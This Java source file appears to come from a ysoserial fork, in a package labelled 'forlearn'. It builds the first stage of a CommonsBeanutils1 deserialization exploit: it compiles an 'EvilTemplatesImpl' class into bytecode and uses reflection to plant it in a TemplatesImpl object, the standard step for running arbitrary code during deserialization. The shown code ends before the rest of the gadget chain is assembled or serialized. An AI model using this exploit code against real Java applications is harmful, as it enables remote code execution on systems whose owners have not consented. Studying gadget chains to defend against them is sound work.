package ysoserial.payloads.forlearn;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.evil.clazz.EvilTemplatesImpl;

import java.lang.reflect.Field;

@Authors({ Authors.M01E })
public class CommonsBeanutils1_simple_WithoutCC {

    private static void setFiledValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    public static void main(String[] args) {
        try {
            byte[] codes = ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode();
            byte[][] _bytecodes = new byte[][]{
                codes,
            };
            TemplatesImpl templatesObj = new TemplatesImpl();
            setFiledValue(templatesObj, "_bytecodes", _bytecodes);
            setFiledValue(templatesObj, "_name", "whatever");
            setFiledValue(templatesObj, "_tfactory", new TransformerFactoryImpl());


        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
